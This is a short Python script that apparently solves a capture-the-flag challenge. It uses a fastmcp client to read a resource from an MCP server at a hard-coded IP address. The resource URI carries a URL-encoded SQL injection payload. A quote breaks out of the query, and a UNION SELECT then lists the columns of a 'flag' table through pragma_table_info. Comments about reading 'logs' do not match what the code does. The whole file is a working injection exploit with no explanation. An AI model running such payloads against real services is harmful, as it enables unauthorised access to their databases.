import asyncio
from fastmcp import Client

SERVER_URL = "http://154.57.164.78:30227/mcp"

async def main():
    client = Client(SERVER_URL)
    async with client:
        # Read the logs resource using its URI
        response = await client.read_resource("price://banana%27%20and%201%3D0%20UNION%20SELECT%20%28SELECT%20GROUP_CONCAT%28name%29%20FROM%20pragma_table_info%28%27flag%27%29%29--%20")
        
        # Extract and print the text content
        logs_text = response[0].text
        print("=== Server Logs ===")
        print(logs_text)

if __name__ == "__main__":
    asyncio.run(main())